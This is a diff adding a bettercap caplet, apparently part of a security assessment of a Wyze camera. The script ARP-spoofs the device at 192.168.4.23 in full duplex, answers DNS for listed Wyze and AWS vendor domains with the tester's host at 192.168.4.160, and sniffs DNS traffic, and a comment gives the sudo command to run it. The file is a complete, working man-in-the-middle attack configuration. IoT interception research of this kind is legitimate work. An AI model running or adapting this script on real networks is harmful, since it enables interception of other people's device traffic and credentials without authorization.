@@ -1,0 +1,17 @@
+# bettercap caplet: put the camera's vendor endpoints on our host.
+#   sudo bettercap -iface en1 -caplet deliverables/scripts/vendor-mitm.cap
+# Target is set by VENDOR_TARGET (default .4.23). Everything not spoofed keeps
+# flowing: arp.spoof forwards, dns.spoof answers only the listed names.
+set arp.spoof.targets 192.168.4.23
+set arp.spoof.internal true
+set arp.spoof.fullduplex true
+arp.spoof on
+
+set dns.spoof.address 192.168.4.160
+set dns.spoof.all false
+set dns.spoof.domains app.wyzecam.com, api.wyzecam.com, wyze.com, s3-us-west-2.amazonaws.com, prod-sight-safe-auth.wyze.com, core-cloud-gateway-lb-prod-456177862.us-west-2.elb.amazonaws.com
+dns.spoof on
+
+set net.sniff.verbose false
+set net.sniff.dns true
+net.sniff on
